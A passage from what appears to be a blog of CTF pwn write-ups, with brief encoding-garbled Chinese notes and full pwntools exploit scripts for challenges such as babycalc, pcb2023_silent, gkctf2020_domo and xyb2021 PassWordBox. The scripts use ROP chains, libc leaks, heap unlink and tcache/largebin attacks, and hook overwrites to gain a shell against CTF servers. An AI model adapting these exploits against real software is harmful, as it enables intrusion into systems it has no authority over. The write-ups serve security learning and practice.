context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28769)
# io=process(&amp;quot;./babycalc&amp;quot;)
elf=ELF(&amp;quot;./babycalc&amp;quot;)
libc=elf.libc

bss_addr=0x6024E0
pop_rdi=0x400ca3
ret=0x4005b9
start=0x400650

payload1=str(0x18).encode().ljust(8,b&amp;quot;\x00&amp;quot;)+p64(ret)*21+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.sym[&#39;puts&#39;])+p64(start)
#   0x18 to change rbp+0x8 low 1 byte
payload2=p8(0x13)+p8(0x24)+p8(0x35)+p8(0x46)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)
payload=payload1+payload2

payload=payload.ljust(0xfc,b&amp;quot;a&amp;quot;)+p32(0x38)
#   payload 0x100-&amp;gt; rbp low 1 byte -&amp;gt; \x00 -&amp;gt; point to stack
#   var_38[0x39] -&amp;gt; rbp+0x1 -&amp;gt; change nop to leave

io.sendafter(b&amp;quot;:&amp;quot;,payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))


################


# gdb.attach(io)
# pause()

payload1=str(0x18).encode().ljust(8,b&amp;quot;\x00&amp;quot;)+p64(ret)*21+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
payload1=payload1.ljust(0xd0,b&amp;quot;a&amp;quot;)
#   0x18 to change rbp+0x8 low 1 byte
payload2=p8(0x13)+p8(0x24)+p8(0x35)+p8(0x46)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)
payload=payload1+payload2

payload=payload.ljust(0xfc,b&amp;quot;a&amp;quot;)+p32(0x38)

io.sendafter(b&amp;quot;:&amp;quot;,payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400c9c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c9e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400ca0 : pop r14 ; pop r15 ; ret
# 0x0000000000400ca2 : pop r15 ; ret
# 0x0000000000400c9b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c9f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006b0 : pop rbp ; ret
# 0x0000000000400ca3 : pop rdi ; ret
# 0x0000000000400ca1 : pop rsi ; pop r15 ; ret
# 0x0000000000400c9d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005b9 : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pcb2023_silent&#34;&gt;pcb2023_silent&lt;/h3&gt;
&lt;p&gt;Full Relroï¼Œåªç»™äº†ä¸ªreadï¼Œäººå¤ªè ¢äº†æ‰¾ä¸åˆ°magic gadgetï¼Œåªæœ‰æš´åŠ›&lt;br&gt;
è¿™é‡Œæˆ‘åŠ«æŒæ ˆä¸Šçš„æ®‹ç•™çš„ä¸€å—libcä¸­åœ°å€ï¼Œæ‰¾çš„gadgetåœ¨libcåç§»ä¸º&lt;code&gt;0x110130&lt;/code&gt;&lt;br&gt;
å¤§æ¦‚ç‡äº‹ä»¶æ˜¯çˆ†3ä½,&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;4096&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1/16^3=1/4096&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;
è¿”å›çš„æ˜¯&lt;code&gt;write+64&lt;/code&gt;ï¼Œæº¢å‡ºç©ºé—´è¶³å¤Ÿæ§åˆ¶å¯„å­˜å™¨çš„å€¼ï¼Œå¯ä»¥leakå‡ºreadçš„libcåœ°å€&lt;br&gt;
ç„¶åè¿”å›&lt;code&gt;_start&lt;/code&gt;ï¼Œç„¶åå¾€bssæ®µä¸Šå†™orw shellcode&lt;br&gt;
è¿”å›&lt;code&gt;_start&lt;/code&gt;ï¼Œmprotectèµ‹äºˆbssæ®µrwxæƒé™åå†æ¬¡è¿”å›&lt;code&gt;_start&lt;/code&gt;ï¼Œæº¢å‡ºè·³è½¬æ‰§è¡Œshellcodeå³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

ggg=asm(shellcraft.open(&#39;./flag&#39;))+asm(shellcraft.read(3,0x601d00,0x100))+asm(shellcraft.write(1,0x601d00,0x100))

def pwn():

    ret=0x400696
    pop_rdi=0x400963
    pop_rsi_r15=0x400961
    main=0x400879
    pop_rbp=0x400788
    bss_addr=0x601800
    pop_rsp_r13_r14_r15=0x40095d
    read_plt=elf.plt[b&amp;quot;read&amp;quot;]


    # for i in range(2):
    #     payload=cyclic(0x48)+p64(main)
    #     io.send(payload)


    # payload=p64(elf.got[b&amp;quot;read&amp;quot;])*0x10
    # io.send(payload)

    # gdb.attach(io)
    # pause()

    payload=p64(bss_addr)*9+p64(ret)*0xb+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;read&amp;quot;])*2+b&amp;quot;\x30\xf1\x8d&amp;quot;
    io.send(payload)

    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;read&amp;quot;]
    print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

    open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
    read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
    write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
    mprotect_a=leak_addr+libc.sym[b&amp;quot;mprotect&amp;quot;]
    pop_rdx=leak_addr+0x1b96
    syscall_ret=leak_addr+0x0b1165
    pop_rax=leak_addr+0x1ced0


    payload=p64(bss_addr)*9+p64(ret)*0xb+p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss_addr)*2+p64(read_plt)+p64(0x400720)
    io.send(payload)

    io.send(ggg)

    mpp=p64(pop_rdi)+p64(0x601000)+p64(pop_rsi_r15)+p64(0x1000)+p64(0)+p64(pop_rdx)+p64(7)+p64(mprotect_a)+p64(0x400720)

    payload=p64(bss_addr)*9+mpp
    io.send(payload)

    # gdb.attach(io)
    # pause()

    payload=p64(bss_addr)*10
    io.send(payload)
    
    sleep(0.2)
    t=io.recv()
    print(t)
    

while True:
    try:
        # io=process(&amp;quot;./silent&amp;quot;)
        io=remote(&amp;quot;172.10.0.8&amp;quot;,9999)
        elf=ELF(&amp;quot;./silent&amp;quot;)
        libc=elf.libc
        pwn()
        
    except:
        io.close()
        continue

# Gadgets information
# ============================================================
# 0x0000000000400876 : leave ; ret
# 0x00000000004007e2 : mov byte ptr [rip + 0x20084f], 1 ; pop rbp ; ret
# 0x00000000004008f7 : mov eax, 0 ; leave ; ret
# 0x000000000040095c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040095e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400960 : pop r14 ; pop r15 ; ret
# 0x0000000000400962 : pop r15 ; ret
# 0x000000000040095b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040095f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400788 : pop rbp ; ret
# 0x0000000000400963 : pop rdi ; ret
# 0x0000000000400961 : pop rsi ; pop r15 ; ret
# 0x000000000040095d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400696 : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;dfjk2022_smallcontainer&#34;&gt;dfjk2022_smallcontainer:&lt;/h3&gt;
&lt;p&gt;æ²¡æœ‰uafï¼Œä¸è¿‡editçš„æ—¶å€™æœ‰&lt;code&gt;check()&lt;/code&gt;ä¼šæ£€æŸ¥è¾“å…¥æ˜¯å¦ä¸º&lt;code&gt;\x11&lt;/code&gt;ï¼Œä¼šå°†&lt;code&gt;\x11&lt;/code&gt;ç½®0,æˆ‘ä»¬åªéœ€è¦å°†editçš„å †å—å…¨éƒ¨å†™æ»¡&lt;code&gt;\x11&lt;/code&gt;ï¼ŒæŒ‡é’ˆé€’å¢åˆ°ä¸‹ä¸ªå †å—çš„&lt;code&gt;\x11&lt;/code&gt;ä¹Ÿä¼šç½®0,è¿™æ ·æˆ‘ä»¬å°±æœ‰ä¸€ä¸ªoff by nulläº†&lt;br&gt;
showæ— æ£€æŸ¥å¯ä»¥æ³„éœ²libc&lt;br&gt;
åé¢æ„é€ unlinkå³å¯ï¼Œæ³¨æ„æ„é€ unlinkçš„è§¦å‘å †å—ä¸èƒ½åœ¨tcacheé‡Œé¢&lt;br&gt;
unlinkåchunk overlapï¼Œæœ€åtcachebin attackåŠ«æŒ&lt;code&gt;__free_hook&lt;/code&gt;ä¸º&lt;code&gt;one_gadget&lt;/code&gt;å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28820)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=elf.libc

def add(s):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    io.send(cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(0x120)

add(0x130) #8

for i in range(8):
    delete(i)
    
add(0x100) #0
show(0)
leak_addr=int(io.recv(12),16)-0x3ebdc0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f302


delete(0)
delete(8)

for i in range(7):
    add(0x1f8)

add(0x1f8) #7
add(0x228) #8
add(0x200) #9
add(0x220) #10
add(0x228) #11


#unlink
for i in range(7):
    delete(i)
    
delete(7)

payload=b&amp;quot;\x11&amp;quot;*0x228
edit(8,payload)

payload=b&amp;quot;\x11&amp;quot;*0x220+p64(0x430)
edit(8,payload)

payload=b&amp;quot;\x11&amp;quot;*0x1f8+p64(0x241)
edit(9,payload)
delete(9)



#overlap
delete(11)
delete(8)

add(0x250) #0
edit(0,b&amp;quot;\x00&amp;quot;*0x1f8+p64(0x230)+p64(free_hook))

add(0x228) #1
add(0x228) #2
edit(2,p64(shell))

delete(2)

io.interactive()

# 0x4f2a5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f302 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a2fc execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;gkctf2020_domo&#34;&gt;gkctf2020_domo:&lt;/h3&gt;
&lt;p&gt;addå­˜åœ¨off by nullï¼Œå¯ä»¥unlinkæ„é€ chunk overlap&lt;br&gt;
åŠ«æŒ&lt;code&gt;__malloc_hook&lt;/code&gt;ä¸º&lt;code&gt;one_gadget&lt;/code&gt;&lt;br&gt;
å¦‚æœç›´æ¥addè°ƒç”¨&lt;code&gt;__malloc_hook&lt;/code&gt;ä¼šæœ‰æ£€æŸ¥&lt;br&gt;
å¯ä»¥åˆ©ç”¨scanfè¾“å…¥è¿‡é•¿æ•°æ®è§¦å‘&lt;code&gt;malloc()&lt;/code&gt;æ‹¿shell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./domo&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28478)
elf=ELF(&amp;quot;./domo&amp;quot;)
libc=elf.libc

def add(s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))

def edit(n,addr,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;addr:\n&amp;quot;,str(addr))
    io.sendafter(b&amp;quot;num:\n&amp;quot;,cc)
    
# gdb.attach(io)
# pause()

add(0x100,b&amp;quot;nmsl&amp;quot;) #0
add(0x20,b&amp;quot;gap&amp;quot;) #1
delete(0)
add(0x100,b&amp;quot;a&amp;quot;) #0
show(0)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c4b61
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
shell=leak_addr+0xf1247

add(0xf0,b&amp;quot;aaa&amp;quot;) #2
add(0x68,b&amp;quot;ddd&amp;quot;) #3
add(0xf0,b&amp;quot;eee&amp;quot;) #4
add(0xf0,b&amp;quot;gap&amp;quot;) #5

delete(2)
delete(3)
add(0x68,b&amp;quot;\x00&amp;quot;*0x60+p64(0x170)) #2
delete(4)

delete(2)

add(0x108,cyclic(0xf8)+p64(0x70)+p64(malloc_hook-0x23))

add(0x60,b&amp;quot;rrr&amp;quot;) #6
add(0x60,cyclic(0x13)+p64(shell)) #7

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;*0x10000)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xyb2021_passwordbox_freeversion&#34;&gt;xyb2021_PassWordBox_FreeVersion:&lt;/h3&gt;
&lt;p&gt;addå’Œshowæœ‰å¼‚æˆ–æ“ä½œï¼Œeditæ— ï¼Œç”±äº&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mtext&gt;â€…â€Š&lt;/mtext&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mtext&gt;â€…â€Š&lt;/mtext&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mspace width=&#34;1em&#34;/&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;a \; xor \; 0=a \quad(a&amp;gt;=0)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:1em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.36687em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œæ‰€ä»¥é‡‡ç”¨&lt;code&gt;\x00&lt;/code&gt;æ³„éœ²å¼‚æˆ–çš„&lt;code&gt;key&lt;/code&gt;&lt;br&gt;
addå­˜åœ¨off by nullï¼Œé‡‡ç”¨unlinkæ‰“chunk overlap&lt;br&gt;
ç„¶å2.27å¯ä»¥double freeï¼ŒåŠ«æŒ&lt;code&gt;__free_hook&lt;/code&gt;ä¸º&lt;code&gt;one_gadget&lt;/code&gt;å³å¯&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;PassWordBox_FreeVersionfrom pwn import *
context(log_level=&amp;quot;debug&amp;quot;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwdFree&amp;quot;) 
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28820)
elf=ELF(&amp;quot;./pwdFree&amp;quot;)
libc=elf.libc

def add(s,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Save:&amp;quot;,b&amp;quot;aaa&amp;quot;)
    io.sendlineafter(b&amp;quot;Of Your Pwd:&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Your Pwd:&amp;quot;,cc)
    
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendline(str(n))
    io.send(cc)
    
    
def show(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Check:\n&amp;quot;,str(n))
    
    
def delete(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Delete:\n&amp;quot;,str(n))


# gdb.attach(io)
# pause()

add(0xf8,b&amp;quot;\x00&amp;quot;*8)
io.recvuntil(b&amp;quot;ID:&amp;quot;)
key=u64(io.recv(8))
print(&amp;quot;key: &amp;quot;,hex(key))
delete(0)

#unlink
for i in range(8):
    add(0xf8,b&amp;quot;a&amp;quot;)

add(0x68,b&amp;quot;aa&amp;quot;) #8
add(0xf8,b&amp;quot;aa&amp;quot;) #9
add(0x20,b&amp;quot;gap&amp;quot;) #10

for i in range(8):
    delete(i)

delete(8)
payload=p64(0xdeadbeef^key)*0xc+p64(0x170^key)
add(0x68,payload)

delete(9)

delete(8)

# ###
for i in range(7):
    add(0xf8,b&amp;quot;www&amp;quot;)

add(0xf8,b&amp;quot;aaa&amp;quot;) #8
show(0)
io.recvuntil(b&amp;quot;is: &amp;quot;)
leak_addr=u64(io.recv(8))^key
leak_addr-=0x3ebca0
print(&amp;quot;leak_addr: &amp;quot; + hex(leak_addr))

shell=leak_addr+0x4f432
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

add(0x60,b&amp;quot;asd&amp;quot;) #9
show(9)
delete(0)
edit(9,p64(0)*2)
show(9)
delete(9)

add(0x60,p64(free_hook^key))
add(0x60,b&amp;quot;a&amp;quot;)
add(0x60,p64(shell^key))

delete(8)

io.interactive()                     

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xyb2021_passwordbox_proversion&#34;&gt;xyb2021_PassWordBox_ProVersion:&lt;/h3&gt;
&lt;p&gt;åªèƒ½ç”³è¯·largebinå¤§å°èŒƒå›´çš„å †å—ï¼Œé‡‡ç”¨largebin attackæ‰“mpçš„æ–¹æ³•ï¼Œç„¶åtcache poisoningå¸¦èµ°&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwdPro&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28934)
elf=ELF(&amp;quot;./pwdPro&amp;quot;)
libc=elf.libc

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Add:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;Save:&amp;quot;,b&amp;quot;a&amp;quot;*3)
    io.sendlineafter(b&amp;quot;Pwd:&amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Pwd:&amp;quot;,cc)

def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Edit:\n&amp;quot;,str(n))
    io.send(cc)

def show(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Check:\n&amp;quot;,str(n))

def delete(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Delete:\n&amp;quot;,str(n))

def recover(n):
    io.sendlineafter(b&amp;quot;Choice:\n&amp;quot;,b&amp;quot;5&amp;quot;)
    io.sendlineafter(b&amp;quot;Recover:\n&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0,0x5a0,b&amp;quot;\x00&amp;quot;)
io.recvuntil(b&amp;quot;ID:&amp;quot;)
key=u64(io.recv(8))
print(&amp;quot;key: &amp;quot;,hex(key))

add(1,0x590,b&amp;quot;a&amp;quot;*8)
add(2,0x590,b&amp;quot;a&amp;quot;*8)

delete(0)
recover(0)
show(0)

io.recvuntil(b&amp;quot;is: &amp;quot;)

leak_addr=(u64(io.recv(8))^key)-0x1eb1e0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
mp_addr=leak_addr+0x1eb2d0


### largebin_attack
add(15,0x800,b&amp;quot;a&amp;quot;*8)
payload=p64(leak_addr+0x1ec010)*2+p64(mp_addr-0x20)*2
edit(0,payload)

delete(2)

add(16,0x800,b&amp;quot;a&amp;quot;)
###

add(6,0x600,b&amp;quot;a&amp;quot;)
add(7,0x600,b&amp;quot;a&amp;quot;)
add(8,0x600,b&amp;quot;a&amp;quot;)

delete(6)
recover(6)
delete(7)
recover(7)

edit(7,p64(free_hook))
add(6,0x600,b&amp;quot;a&amp;quot;)
add(7,0x600,b&amp;quot;a&amp;quot;)
edit(7,p64(sys_addr))

edit(16,b&amp;quot;/bin/sh\x00&amp;quot;)
